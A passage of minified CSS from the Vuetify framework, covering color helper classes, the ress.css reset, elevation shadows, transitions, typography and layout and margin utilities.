.orange--text.text--darken-2{color:#f57c00!important;caret-color:#f57c00!important}.v-application .orange.darken-3{background-color:#ef6c00!important;border-color:#ef6c00!important}.v-application .orange--text.text--darken-3{color:#ef6c00!important;caret-color:#ef6c00!important}.v-application .orange.darken-4{background-color:#e65100!important;border-color:#e65100!important}.v-application .orange--text.text--darken-4{color:#e65100!important;caret-color:#e65100!important}.v-application .orange.accent-1{background-color:#ffd180!important;border-color:#ffd180!important}.v-application .orange--text.text--accent-1{color:#ffd180!important;caret-color:#ffd180!important}.v-application .orange.accent-2{background-color:#ffab40!important;border-color:#ffab40!important}.v-application .orange--text.text--accent-2{color:#ffab40!important;caret-color:#ffab40!important}.v-application .orange.accent-3{background-color:#ff9100!important;border-color:#ff9100!important}.v-application .orange--text.text--accent-3{color:#ff9100!important;caret-color:#ff9100!important}.v-application .orange.accent-4{background-color:#ff6d00!important;border-color:#ff6d00!important}.v-application .orange--text.text--accent-4{color:#ff6d00!important;caret-color:#ff6d00!important}.v-application .deep-orange{background-color:#ff5722!important;border-color:#ff5722!important}.v-application .deep-orange--text{color:#ff5722!important;caret-color:#ff5722!important}.v-application .deep-orange.lighten-5{background-color:#fbe9e7!important;border-color:#fbe9e7!important}.v-application .deep-orange--text.text--lighten-5{color:#fbe9e7!important;caret-color:#fbe9e7!important}.v-application .deep-orange.lighten-4{background-color:#ffccbc!important;border-color:#ffccbc!important}.v-application .deep-orange--text.text--lighten-4{color:#ffccbc!important;caret-color:#ffccbc!important}.v-application .deep-orange.lighten-3{background-color:#ffab91!important;border-color:#ffab91!important}.v-application .deep-orange--text.text--lighten-3{color:#ffab91!important;caret-color:#ffab91!important}.v-application .deep-orange.lighten-2{background-color:#ff8a65!important;border-color:#ff8a65!important}.v-application .deep-orange--text.text--lighten-2{color:#ff8a65!important;caret-color:#ff8a65!important}.v-application .deep-orange.lighten-1{background-color:#ff7043!important;border-color:#ff7043!important}.v-application .deep-orange--text.text--lighten-1{color:#ff7043!important;caret-color:#ff7043!important}.v-application .deep-orange.darken-1{background-color:#f4511e!important;border-color:#f4511e!important}.v-application .deep-orange--text.text--darken-1{color:#f4511e!important;caret-color:#f4511e!important}.v-application .deep-orange.darken-2{background-color:#e64a19!important;border-color:#e64a19!important}.v-application .deep-orange--text.text--darken-2{color:#e64a19!important;caret-color:#e64a19!important}.v-application .deep-orange.darken-3{background-color:#d84315!important;border-color:#d84315!important}.v-application .deep-orange--text.text--darken-3{color:#d84315!important;caret-color:#d84315!important}.v-application .deep-orange.darken-4{background-color:#bf360c!important;border-color:#bf360c!important}.v-application .deep-orange--text.text--darken-4{color:#bf360c!important;caret-color:#bf360c!important}.v-application .deep-orange.accent-1{background-color:#ff9e80!important;border-color:#ff9e80!important}.v-application .deep-orange--text.text--accent-1{color:#ff9e80!important;caret-color:#ff9e80!important}.v-application .deep-orange.accent-2{background-color:#ff6e40!important;border-color:#ff6e40!important}.v-application .deep-orange--text.text--accent-2{color:#ff6e40!important;caret-color:#ff6e40!important}.v-application .deep-orange.accent-3{background-color:#ff3d00!important;border-color:#ff3d00!important}.v-application .deep-orange--text.text--accent-3{color:#ff3d00!important;caret-color:#ff3d00!important}.v-application .deep-orange.accent-4{background-color:#dd2c00!important;border-color:#dd2c00!important}.v-application .deep-orange--text.text--accent-4{color:#dd2c00!important;caret-color:#dd2c00!important}.v-application .brown{background-color:#795548!important;border-color:#795548!important}.v-application .brown--text{color:#795548!important;caret-color:#795548!important}.v-application .brown.lighten-5{background-color:#efebe9!important;border-color:#efebe9!important}.v-application .brown--text.text--lighten-5{color:#efebe9!important;caret-color:#efebe9!important}.v-application .brown.lighten-4{background-color:#d7ccc8!important;border-color:#d7ccc8!important}.v-application .brown--text.text--lighten-4{color:#d7ccc8!important;caret-color:#d7ccc8!important}.v-application .brown.lighten-3{background-color:#bcaaa4!important;border-color:#bcaaa4!important}.v-application .brown--text.text--lighten-3{color:#bcaaa4!important;caret-color:#bcaaa4!important}.v-application .brown.lighten-2{background-color:#a1887f!important;border-color:#a1887f!important}.v-application .brown--text.text--lighten-2{color:#a1887f!important;caret-color:#a1887f!important}.v-application .brown.lighten-1{background-color:#8d6e63!important;border-color:#8d6e63!important}.v-application .brown--text.text--lighten-1{color:#8d6e63!important;caret-color:#8d6e63!important}.v-application .brown.darken-1{background-color:#6d4c41!important;border-color:#6d4c41!important}.v-application .brown--text.text--darken-1{color:#6d4c41!important;caret-color:#6d4c41!important}.v-application .brown.darken-2{background-color:#5d4037!important;border-color:#5d4037!important}.v-application .brown--text.text--darken-2{color:#5d4037!important;caret-color:#5d4037!important}.v-application .brown.darken-3{background-color:#4e342e!important;border-color:#4e342e!important}.v-application .brown--text.text--darken-3{color:#4e342e!important;caret-color:#4e342e!important}.v-application .brown.darken-4{background-color:#3e2723!important;border-color:#3e2723!important}.v-application .brown--text.text--darken-4{color:#3e2723!important;caret-color:#3e2723!important}.v-application .blue-grey{background-color:#607d8b!important;border-color:#607d8b!important}.v-application .blue-grey--text{color:#607d8b!important;caret-color:#607d8b!important}.v-application .blue-grey.lighten-5{background-color:#eceff1!important;border-color:#eceff1!important}.v-application .blue-grey--text.text--lighten-5{color:#eceff1!important;caret-color:#eceff1!important}.v-application .blue-grey.lighten-4{background-color:#cfd8dc!important;border-color:#cfd8dc!important}.v-application .blue-grey--text.text--lighten-4{color:#cfd8dc!important;caret-color:#cfd8dc!important}.v-application .blue-grey.lighten-3{background-color:#b0bec5!important;border-color:#b0bec5!important}.v-application .blue-grey--text.text--lighten-3{color:#b0bec5!important;caret-color:#b0bec5!important}.v-application .blue-grey.lighten-2{background-color:#90a4ae!important;border-color:#90a4ae!important}.v-application .blue-grey--text.text--lighten-2{color:#90a4ae!important;caret-color:#90a4ae!important}.v-application .blue-grey.lighten-1{background-color:#78909c!important;border-color:#78909c!important}.v-application .blue-grey--text.text--lighten-1{color:#78909c!important;caret-color:#78909c!important}.v-application .blue-grey.darken-1{background-color:#546e7a!important;border-color:#546e7a!important}.v-application .blue-grey--text.text--darken-1{color:#546e7a!important;caret-color:#546e7a!important}.v-application .blue-grey.darken-2{background-color:#455a64!important;border-color:#455a64!important}.v-application .blue-grey--text.text--darken-2{color:#455a64!important;caret-color:#455a64!important}.v-application .blue-grey.darken-3{background-color:#37474f!important;border-color:#37474f!important}.v-application .blue-grey--text.text--darken-3{color:#37474f!important;caret-color:#37474f!important}.v-application .blue-grey.darken-4{background-color:#263238!important;border-color:#263238!important}.v-application .blue-grey--text.text--darken-4{color:#263238!important;caret-color:#263238!important}.v-application .grey{background-color:#9e9e9e!important;border-color:#9e9e9e!important}.v-application .grey--text{color:#9e9e9e!important;caret-color:#9e9e9e!important}.v-application .grey.lighten-5{background-color:#fafafa!important;border-color:#fafafa!important}.v-application .grey--text.text--lighten-5{color:#fafafa!important;caret-color:#fafafa!important}.v-application .grey.lighten-4{background-color:#f5f5f5!important;border-color:#f5f5f5!important}.v-application .grey--text.text--lighten-4{color:#f5f5f5!important;caret-color:#f5f5f5!important}.v-application .grey.lighten-3{background-color:#eee!important;border-color:#eee!important}.v-application .grey--text.text--lighten-3{color:#eee!important;caret-color:#eee!important}.v-application .grey.lighten-2{background-color:#e0e0e0!important;border-color:#e0e0e0!important}.v-application .grey--text.text--lighten-2{color:#e0e0e0!important;caret-color:#e0e0e0!important}.v-application .grey.lighten-1{background-color:#bdbdbd!important;border-color:#bdbdbd!important}.v-application .grey--text.text--lighten-1{color:#bdbdbd!important;caret-color:#bdbdbd!important}.v-application .grey.darken-1{background-color:#757575!important;border-color:#757575!important}.v-application .grey--text.text--darken-1{color:#757575!important;caret-color:#757575!important}.v-application .grey.darken-2{background-color:#616161!important;border-color:#616161!important}.v-application .grey--text.text--darken-2{color:#616161!important;caret-color:#616161!important}.v-application .grey.darken-3{background-color:#424242!important;border-color:#424242!important}.v-application .grey--text.text--darken-3{color:#424242!important;caret-color:#424242!important}.v-application .grey.darken-4{background-color:#212121!important;border-color:#212121!important}.v-application .grey--text.text--darken-4{color:#212121!important;caret-color:#212121!important}.v-application .shades.black{background-color:#000!important;border-color:#000!important}.v-application .shades--text.text--black{color:#000!important;caret-color:#000!important}.v-application .shades.white{background-color:#fff!important;border-color:#fff!important}.v-application .shades--text.text--white{color:#fff!important;caret-color:#fff!important}.v-application .shades.transparent{background-color:transparent!important;border-color:transparent!important}.v-application .shades--text.text--transparent{color:transparent!important;caret-color:transparent!important}/*!
 * ress.css • v2.0.4
 * MIT License
 * github.com/filipelinhares/ress
 */html{box-sizing:border-box;overflow-y:scroll;-webkit-text-size-adjust:100%;word-break:normal;-moz-tab-size:4;-o-tab-size:4;tab-size:4}*,:after,:before{background-repeat:no-repeat;box-sizing:inherit}:after,:before{text-decoration:inherit;vertical-align:inherit}*{padding:0;margin:0}hr{overflow:visible;height:0}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}a{background-color:transparent}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace,monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}input{border-radius:0}[disabled]{cursor:default}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}textarea{overflow:auto;resize:vertical}button,input,optgroup,select,textarea{font:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}[role=button],[type=button],[type=reset],[type=submit],button{cursor:pointer;color:inherit}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button:-moz-focusring{outline:1px dotted ButtonText}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}button,input,select,textarea{background-color:transparent;border-style:none}select{-moz-appearance:none;-webkit-appearance:none}select::-ms-expand{display:none}select::-ms-value{color:currentColor}legend{border:0;color:inherit;display:table;white-space:normal;max-width:100%}::-webkit-file-upload-button{-webkit-appearance:button;color:inherit;font:inherit}img{border-style:none}progress{vertical-align:baseline}@media screen{[hidden~=screen]{display:inherit}[hidden~=screen]:not(:active):not(:focus):not(:target){position:absolute!important;clip:rect(0 0 0 0)!important}}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}.v-application .elevation-24{box-shadow:0 11px 15px -7px rgba(0,0,0,.2),0 24px 38px 3px rgba(0,0,0,.14),0 9px 46px 8px rgba(0,0,0,.12)!important}.v-application .elevation-23{box-shadow:0 11px 14px -7px rgba(0,0,0,.2),0 23px 36px 3px rgba(0,0,0,.14),0 9px 44px 8px rgba(0,0,0,.12)!important}.v-application .elevation-22{box-shadow:0 10px 14px -6px rgba(0,0,0,.2),0 22px 35px 3px rgba(0,0,0,.14),0 8px 42px 7px rgba(0,0,0,.12)!important}.v-application .elevation-21{box-shadow:0 10px 13px -6px rgba(0,0,0,.2),0 21px 33px 3px rgba(0,0,0,.14),0 8px 40px 7px rgba(0,0,0,.12)!important}.v-application .elevation-20{box-shadow:0 10px 13px -6px rgba(0,0,0,.2),0 20px 31px 3px rgba(0,0,0,.14),0 8px 38px 7px rgba(0,0,0,.12)!important}.v-application .elevation-19{box-shadow:0 9px 12px -6px rgba(0,0,0,.2),0 19px 29px 2px rgba(0,0,0,.14),0 7px 36px 6px rgba(0,0,0,.12)!important}.v-application .elevation-18{box-shadow:0 9px 11px -5px rgba(0,0,0,.2),0 18px 28px 2px rgba(0,0,0,.14),0 7px 34px 6px rgba(0,0,0,.12)!important}.v-application .elevation-17{box-shadow:0 8px 11px -5px rgba(0,0,0,.2),0 17px 26px 2px rgba(0,0,0,.14),0 6px 32px 5px rgba(0,0,0,.12)!important}.v-application .elevation-16{box-shadow:0 8px 10px -5px rgba(0,0,0,.2),0 16px 24px 2px rgba(0,0,0,.14),0 6px 30px 5px rgba(0,0,0,.12)!important}.v-application .elevation-15{box-shadow:0 8px 9px -5px rgba(0,0,0,.2),0 15px 22px 2px rgba(0,0,0,.14),0 6px 28px 5px rgba(0,0,0,.12)!important}.v-application .elevation-14{box-shadow:0 7px 9px -4px rgba(0,0,0,.2),0 14px 21px 2px rgba(0,0,0,.14),0 5px 26px 4px rgba(0,0,0,.12)!important}.v-application .elevation-13{box-shadow:0 7px 8px -4px rgba(0,0,0,.2),0 13px 19px 2px rgba(0,0,0,.14),0 5px 24px 4px rgba(0,0,0,.12)!important}.v-application .elevation-12{box-shadow:0 7px 8px -4px rgba(0,0,0,.2),0 12px 17px 2px rgba(0,0,0,.14),0 5px 22px 4px rgba(0,0,0,.12)!important}.v-application .elevation-11{box-shadow:0 6px 7px -4px rgba(0,0,0,.2),0 11px 15px 1px rgba(0,0,0,.14),0 4px 20px 3px rgba(0,0,0,.12)!important}.v-application .elevation-10{box-shadow:0 6px 6px -3px rgba(0,0,0,.2),0 10px 14px 1px rgba(0,0,0,.14),0 4px 18px 3px rgba(0,0,0,.12)!important}.v-application .elevation-9{box-shadow:0 5px 6px -3px rgba(0,0,0,.2),0 9px 12px 1px rgba(0,0,0,.14),0 3px 16px 2px rgba(0,0,0,.12)!important}.v-application .elevation-8{box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)!important}.v-application .elevation-7{box-shadow:0 4px 5px -2px rgba(0,0,0,.2),0 7px 10px 1px rgba(0,0,0,.14),0 2px 16px 1px rgba(0,0,0,.12)!important}.v-application .elevation-6{box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 6px 10px 0 rgba(0,0,0,.14),0 1px 18px 0 rgba(0,0,0,.12)!important}.v-application .elevation-5{box-shadow:0 3px 5px -1px rgba(0,0,0,.2),0 5px 8px 0 rgba(0,0,0,.14),0 1px 14px 0 rgba(0,0,0,.12)!important}.v-application .elevation-4{box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.v-application .elevation-3{box-shadow:0 3px 3px -2px rgba(0,0,0,.2),0 3px 4px 0 rgba(0,0,0,.14),0 1px 8px 0 rgba(0,0,0,.12)!important}.v-application .elevation-2{box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)!important}.v-application .elevation-1{box-shadow:0 2px 1px -1px rgba(0,0,0,.2),0 1px 1px 0 rgba(0,0,0,.14),0 1px 3px 0 rgba(0,0,0,.12)!important}.v-application .elevation-0{box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)!important}.v-application .carousel-transition-enter{transform:translate(100%)}.v-application .carousel-transition-leave,.v-application .carousel-transition-leave-to{position:absolute;top:0;transform:translate(-100%)}.carousel-reverse-transition-enter{transform:translate(-100%)}.carousel-reverse-transition-leave,.carousel-reverse-transition-leave-to{position:absolute;top:0;transform:translate(100%)}.dialog-transition-enter,.dialog-transition-leave-to{transform:scale(.5);opacity:0}.dialog-transition-enter-to,.dialog-transition-leave{opacity:1}.dialog-bottom-transition-enter,.dialog-bottom-transition-leave-to{transform:translateY(100%)}.picker-reverse-transition-enter-active,.picker-reverse-transition-leave-active,.picker-transition-enter-active,.picker-transition-leave-active{transition:.3s cubic-bezier(0,0,.2,1)}.picker-reverse-transition-enter,.picker-reverse-transition-leave-to,.picker-transition-enter,.picker-transition-leave-to{opacity:0}.picker-reverse-transition-leave,.picker-reverse-transition-leave-active,.picker-reverse-transition-leave-to,.picker-transition-leave,.picker-transition-leave-active,.picker-transition-leave-to{position:absolute!important}.picker-transition-enter{transform:translateY(100%)}.picker-reverse-transition-enter,.picker-transition-leave-to{transform:translateY(-100%)}.picker-reverse-transition-leave-to{transform:translateY(100%)}.picker-title-transition-enter-to,.picker-title-transition-leave{transform:translate(0)}.picker-title-transition-enter{transform:translate(-100%)}.picker-title-transition-leave-to{opacity:0;transform:translate(100%)}.picker-title-transition-leave,.picker-title-transition-leave-active,.picker-title-transition-leave-to{position:absolute!important}.tab-transition-enter{transform:translate(100%)}.tab-transition-leave,.tab-transition-leave-active{position:absolute;top:0}.tab-transition-leave-to{position:absolute}.tab-reverse-transition-enter,.tab-transition-leave-to{transform:translate(-100%)}.tab-reverse-transition-leave,.tab-reverse-transition-leave-to{top:0;position:absolute;transform:translate(100%)}.expand-transition-enter-active,.expand-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.expand-transition-move{transition:transform .6s}.expand-x-transition-enter-active,.expand-x-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.expand-x-transition-move{transition:transform .6s}.scale-transition-enter-active,.scale-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scale-transition-move{transition:transform .6s}.scale-transition-enter,.scale-transition-leave,.scale-transition-leave-to{opacity:0;transform:scale(0)}.scale-rotate-transition-enter-active,.scale-rotate-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scale-rotate-transition-move{transition:transform .6s}.scale-rotate-transition-enter,.scale-rotate-transition-leave,.scale-rotate-transition-leave-to{opacity:0;transform:scale(0) rotate(-45deg)}.scale-rotate-reverse-transition-enter-active,.scale-rotate-reverse-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scale-rotate-reverse-transition-move{transition:transform .6s}.scale-rotate-reverse-transition-enter,.scale-rotate-reverse-transition-leave,.scale-rotate-reverse-transition-leave-to{opacity:0;transform:scale(0) rotate(45deg)}.message-transition-enter-active,.message-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.message-transition-move{transition:transform .6s}.message-transition-enter,.message-transition-leave-to{opacity:0;transform:translateY(-15px)}.message-transition-leave,.message-transition-leave-active{position:absolute}.slide-y-transition-enter-active,.slide-y-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.slide-y-transition-move{transition:transform .6s}.slide-y-transition-enter,.slide-y-transition-leave-to{opacity:0;transform:translateY(-15px)}.slide-y-reverse-transition-enter-active,.slide-y-reverse-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.slide-y-reverse-transition-move{transition:transform .6s}.slide-y-reverse-transition-enter,.slide-y-reverse-transition-leave-to{opacity:0;transform:translateY(15px)}.scroll-y-transition-enter-active,.scroll-y-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scroll-y-transition-move{transition:transform .6s}.scroll-y-transition-enter,.scroll-y-transition-leave-to{opacity:0}.scroll-y-transition-enter{transform:translateY(-15px)}.scroll-y-transition-leave-to{transform:translateY(15px)}.scroll-y-reverse-transition-enter-active,.scroll-y-reverse-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scroll-y-reverse-transition-move{transition:transform .6s}.scroll-y-reverse-transition-enter,.scroll-y-reverse-transition-leave-to{opacity:0}.scroll-y-reverse-transition-enter{transform:translateY(15px)}.scroll-y-reverse-transition-leave-to{transform:translateY(-15px)}.scroll-x-transition-enter-active,.scroll-x-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scroll-x-transition-move{transition:transform .6s}.scroll-x-transition-enter,.scroll-x-transition-leave-to{opacity:0}.scroll-x-transition-enter{transform:translateX(-15px)}.scroll-x-transition-leave-to{transform:translateX(15px)}.scroll-x-reverse-transition-enter-active,.scroll-x-reverse-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.scroll-x-reverse-transition-move{transition:transform .6s}.scroll-x-reverse-transition-enter,.scroll-x-reverse-transition-leave-to{opacity:0}.scroll-x-reverse-transition-enter{transform:translateX(15px)}.scroll-x-reverse-transition-leave-to{transform:translateX(-15px)}.slide-x-transition-enter-active,.slide-x-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.slide-x-transition-move{transition:transform .6s}.slide-x-transition-enter,.slide-x-transition-leave-to{opacity:0;transform:translateX(-15px)}.slide-x-reverse-transition-enter-active,.slide-x-reverse-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.slide-x-reverse-transition-move{transition:transform .6s}.slide-x-reverse-transition-enter,.slide-x-reverse-transition-leave-to{opacity:0;transform:translateX(15px)}.fade-transition-enter-active,.fade-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.fade-transition-move{transition:transform .6s}.fade-transition-enter,.fade-transition-leave-to{opacity:0!important}.fab-transition-enter-active,.fab-transition-leave-active{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.fab-transition-move{transition:transform .6s}.fab-transition-enter,.fab-transition-leave-to{transform:scale(0) rotate(-45deg)}.v-application .blockquote{padding:16px 0 16px 24px;font-size:18px;font-weight:300}.v-application code,.v-application kbd{border-radius:3px;font-size:85%;font-weight:900}.v-application code{background-color:#fbe5e1;color:#c0341d;padding:0 .4rem}.v-application kbd{background:#212529;color:#fff;padding:.2rem .4rem}html{font-size:16px;overflow-x:hidden;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:rgba(0,0,0,0)}html.overflow-y-hidden{overflow-y:hidden!important}.v-application{font-family:"Roboto",sans-serif;line-height:1.5}.v-application ::-ms-clear,.v-application ::-ms-reveal{display:none}.v-application .theme--light.heading{color:rgba(0,0,0,.87)}.v-application .theme--dark.heading{color:#fff}.v-application ol,.v-application ul{padding-left:24px}.v-application .display-4{font-size:6rem!important;line-height:6rem;letter-spacing:-.015625em!important}.v-application .display-3,.v-application .display-4{font-weight:300;font-family:"Roboto",sans-serif!important}.v-application .display-3{font-size:3.75rem!important;line-height:3.75rem;letter-spacing:-.0083333333em!important}.v-application .display-2{font-size:3rem!important;line-height:3.125rem;letter-spacing:normal!important}.v-application .display-1,.v-application .display-2{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .display-1{font-size:2.125rem!important;line-height:2.5rem;letter-spacing:.0073529412em!important}.v-application .headline{font-size:1.5rem!important;font-weight:400;letter-spacing:normal!important}.v-application .headline,.v-application .title{line-height:2rem;font-family:"Roboto",sans-serif!important}.v-application .title{font-size:1.25rem!important;font-weight:500;letter-spacing:.0125em!important}.v-application .subtitle-2{font-size:.875rem!important;font-weight:500;letter-spacing:.0071428571em!important;line-height:1.375rem;font-family:"Roboto",sans-serif!important}.v-application .subtitle-1{font-size:1rem!important;letter-spacing:.009375em!important;line-height:1.75rem}.v-application .body-2,.v-application .subtitle-1{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .body-2{font-size:.875rem!important;letter-spacing:.0178571429em!important;line-height:1.25rem}.v-application .body-1{font-size:1rem!important;letter-spacing:.03125em!important;line-height:1.5rem}.v-application .body-1,.v-application .caption{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .caption{font-size:.75rem!important;letter-spacing:.0333333333em!important;line-height:1.25rem}.v-application .overline{font-size:.75rem!important;font-weight:500;letter-spacing:.1666666667em!important;line-height:2rem;text-transform:uppercase;font-family:"Roboto",sans-serif!important}.v-application p{margin-bottom:16px}@media only print{.v-application .hidden-print-only{display:none!important}}@media only screen{.v-application .hidden-screen-only{display:none!important}}@media only screen and (max-width:599px){.v-application .hidden-xs-only{display:none!important}}@media only screen and (min-width:600px)and (max-width:959px){.v-application .hidden-sm-only{display:none!important}}@media only screen and (max-width:959px){.v-application .hidden-sm-and-down{display:none!important}}@media only screen and (min-width:600px){.v-application .hidden-sm-and-up{display:none!important}}@media only screen and (min-width:960px)and (max-width:1263px){.v-application .hidden-md-only{display:none!important}}@media only screen and (max-width:1263px){.v-application .hidden-md-and-down{display:none!important}}@media only screen and (min-width:960px){.v-application .hidden-md-and-up{display:none!important}}@media only screen and (min-width:1264px)and (max-width:1903px){.v-application .hidden-lg-only{display:none!important}}@media only screen and (max-width:1903px){.v-application .hidden-lg-and-down{display:none!important}}@media only screen and (min-width:1264px){.v-application .hidden-lg-and-up{display:none!important}}@media only screen and (min-width:1904px){.v-application .hidden-xl-only{display:none!important}}.d-sr-only,.d-sr-only-focusable:not(:focus){border:0!important;clip:rect(0,0,0,0)!important;height:1px!important;margin:-1px!important;overflow:hidden!important;padding:0!important;position:absolute!important;white-space:nowrap!important;width:1px!important}.v-application .font-weight-thin{font-weight:100!important}.v-application .font-weight-light{font-weight:300!important}.v-application .font-weight-regular{font-weight:400!important}.v-application .font-weight-medium{font-weight:500!important}.v-application .font-weight-bold{font-weight:700!important}.v-application .font-weight-black{font-weight:900!important}.v-application .font-italic{font-style:italic!important}.v-application .transition-fast-out-slow-in{transition:.3s cubic-bezier(.4,0,.2,1)!important}.v-application .transition-linear-out-slow-in{transition:.3s cubic-bezier(0,0,.2,1)!important}.v-application .transition-fast-out-linear-in{transition:.3s cubic-bezier(.4,0,1,1)!important}.v-application .transition-ease-in-out{transition:.3s cubic-bezier(.4,0,.6,1)!important}.v-application .transition-fast-in-fast-out{transition:.3s cubic-bezier(.25,.8,.25,1)!important}.v-application .transition-swing{transition:.3s cubic-bezier(.25,.8,.5,1)!important}.v-application .overflow-auto{overflow:auto!important}.v-application .overflow-hidden{overflow:hidden!important}.v-application .overflow-visible{overflow:visible!important}.v-application .overflow-x-auto{overflow-x:auto!important}.v-application .overflow-x-hidden{overflow-x:hidden!important}.v-application .overflow-y-auto{overflow-y:auto!important}.v-application .overflow-y-hidden{overflow-y:hidden!important}.v-application .d-none{display:none!important}.v-application .d-inline{display:inline!important}.v-application .d-inline-block{display:inline-block!important}.v-application .d-block{display:block!important}.v-application .d-table{display:table!important}.v-application .d-table-row{display:table-row!important}.v-application .d-table-cell{display:table-cell!important}.v-application .d-flex{display:flex!important}.v-application .d-inline-flex{display:inline-flex!important}.v-application .float-none{float:none!important}.v-application .float-left{float:left!important}.v-application .float-right{float:right!important}.v-application .flex-fill{flex:1 1 auto!important}.v-application .flex-row{flex-direction:row!important}.v-application .flex-column{flex-direction:column!important}.v-application .flex-row-reverse{flex-direction:row-reverse!important}.v-application .flex-column-reverse{flex-direction:column-reverse!important}.v-application .flex-grow-0{flex-grow:0!important}.v-application .flex-grow-1{flex-grow:1!important}.v-application .flex-shrink-0{flex-shrink:0!important}.v-application .flex-shrink-1{flex-shrink:1!important}.v-application .flex-wrap{flex-wrap:wrap!important}.v-application .flex-nowrap{flex-wrap:nowrap!important}.v-application .flex-wrap-reverse{flex-wrap:wrap-reverse!important}.v-application .justify-start{justify-content:flex-start!important}.v-application .justify-end{justify-content:flex-end!important}.v-application .justify-center{justify-content:center!important}.v-application .justify-space-between{justify-content:space-between!important}.v-application .justify-space-around{justify-content:space-around!important}.v-application .align-start{align-items:flex-start!important}.v-application .align-end{align-items:flex-end!important}.v-application .align-center{align-items:center!important}.v-application .align-baseline{align-items:baseline!important}.v-application .align-stretch{align-items:stretch!important}.v-application .align-content-start{align-content:flex-start!important}.v-application .align-content-end{align-content:flex-end!important}.v-application .align-content-center{align-content:center!important}.v-application .align-content-space-between{align-content:space-between!important}.v-application .align-content-space-around{align-content:space-around!important}.v-application .align-content-stretch{align-content:stretch!important}.v-application .align-self-auto{align-self:auto!important}.v-application .align-self-start{align-self:flex-start!important}.v-application .align-self-end{align-self:flex-end!important}.v-application .align-self-center{align-self:center!important}.v-application .align-self-baseline{align-self:baseline!important}.v-application .align-self-stretch{align-self:stretch!important}.v-application .order-first{order:-1!important}.v-application .order-0{order:0!important}.v-application .order-1{order:1!important}.v-application .order-2{order:2!important}.v-application .order-3{order:3!important}.v-application .order-4{order:4!important}.v-application .order-5{order:5!important}.v-application .order-6{order:6!important}.v-application .order-7{order:7!important}.v-application .order-8{order:8!important}.v-application .order-9{order:9!important}.v-application .order-10{order:10!important}.v-application .order-11{order:11!important}.v-application .order-12{order:12!important}.v-application .order-last{order:13!important}.v-application .ma-0{margin:0!important}.v-application .ma-1{margin:4px!important}.v-application .ma-2{margin:8px!important}.v-application .ma-3{margin:12px!important}.v-application .ma-4{margin:16px!important}.v-application .ma-5{margin:20px!important}.v-application .ma-6{margin:24px!important}.v-application .ma-7{margin:28px!important}.v-application .ma-8{margin:32px!important}.v-application .ma-9{margin:36px!important}.v-application .ma-10{margin:40px!important}.v-application .ma-11{margin:44px!important}.v-application .ma-12{margin:48px!important}.v-application .ma-13{margin:52px!important}.v-application .ma-14{margin:56px!important}.v-application .ma-15{margin:60px!important}.v-application .ma-16{margin:64px!important}.v-application .ma-auto{margin:auto!important}.v-application .mx-0{margin-right:0!important;margin-left:0!important}.v-application .mx-1{margin-right:4px!important;margin-left:4px!important}.v-application .mx-2{margin-right:8px!important;margin-left:8px!important}.v-application .mx-3{margin-right:12px!important;margin-left:12px!important}.v-application .mx-4{margin-right:16px!important;margin-left:16px!important}.v-application .mx-5{margin-right:20px!important;margin-left:20px!important}.v-application .mx-6{margin-right:24px!important;margin-left:24px!important}.v-application .mx-7{margin-right:28px!important;margin-left:28px!important}.v-application .mx-8{margin-right:32px!important;margin-left:32px!important}.v-application .mx-9{margin-right:36px!important;margin-left:36px!important}.v-application .mx-10{margin-right:40px!important;margin-left:40px!important}.v-application .mx-11{margin-right:44px!important;margin-left:44px!important}.v-application .mx-12{margin-right:48px!important;margin-left:48px!important}.v-application .mx-13{margin-right:52px!important;margin-left:52px!important}.v-application .mx-14{margin-right:56px!important;margin-left:56px!important}.v-application 